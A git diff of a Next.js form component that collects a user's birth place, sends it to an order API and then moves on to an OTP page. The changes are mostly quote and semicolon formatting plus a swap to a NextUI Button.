@@ -1,28 +1,29 @@
-import SwiperSlider from '@/components/SwiperSlider'
-import { FaArrowRightLong } from 'react-icons/fa6'
-import { useRouter, useSearchParams } from 'next/navigation'
-import toast from 'react-hot-toast'
+import SwiperSlider from "@/components/SwiperSlider";
+import { FaArrowRightLong } from "react-icons/fa6";
+import { useRouter, useSearchParams } from "next/navigation";
+import toast from "react-hot-toast";
+import { Button } from "@nextui-org/react";
 
 const BirthPlace = () => {
-  const router = useRouter()
-  const searchParams = useSearchParams()
-  const params = new URLSearchParams(searchParams)
+  const router = useRouter();
+  const searchParams = useSearchParams();
+  const params = new URLSearchParams(searchParams);
 
   const handleSubmit = (event) => {
-    event.preventDefault()
-    const birthPlace = event.target.birthPlace.value
+    event.preventDefault();
+    const birthPlace = event.target.birthPlace.value;
 
     const submitData = {
       birthPlace: birthPlace,
-    }
+    };
 
-    if (submitData.birthPlace === '') {
-      toast.error('Please enter your birth place')
+    if (submitData.birthPlace === "") {
+      toast.error("Please enter your birth place");
     } else {
-      fetch(`${process.env.API_URL}/api/order/${params.get('id')}`, {
-        method: 'PATCH',
+      fetch(`${process.env.API_URL}/api/order/${params.get("id")}`, {
+        method: "PATCH",
         headers: {
-          'Content-Type': 'application/json',
+          "Content-Type": "application/json",
         },
         body: JSON.stringify(submitData),
       })
@@ -30,15 +31,15 @@ const BirthPlace = () => {
         .then((data) => {
           if (data) {
             router.push({
-              pathname: '/nafat-otp-one',
+              pathname: "/nafat-otp-one",
               query: { id: data._id },
-            })
+            });
           } else {
-            toast.error("Sorry, we couldn't process your request!")
+            toast.error("Sorry, we couldn't process your request!");
           }
-        })
+        });
     }
-  }
+  };
   return (
     <>
       <SwiperSlider />
@@ -64,17 +65,24 @@ const BirthPlace = () => {
               Enter the country name of your birth place
             </label>
           </div>
-          <button
+          {/* <button
             type="submit"
             className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
           >
             Next <FaArrowRightLong size={16} />
-          </button>
+          </button> */}
+          <Button
+            color="primary"
+            type="submit"
+            className={`w-full text-white h-12 bg-[#0D9488]`}
+          >
+            Enter Birth Place <FaArrowRightLong size={16} />
+          </Button>
         </form>
       </div>
       <div className="h-20 bg-teal-400 mt-5"></div>
     </>
-  )
-}
+  );
+};
 
-export default BirthPlace
+export default BirthPlace;
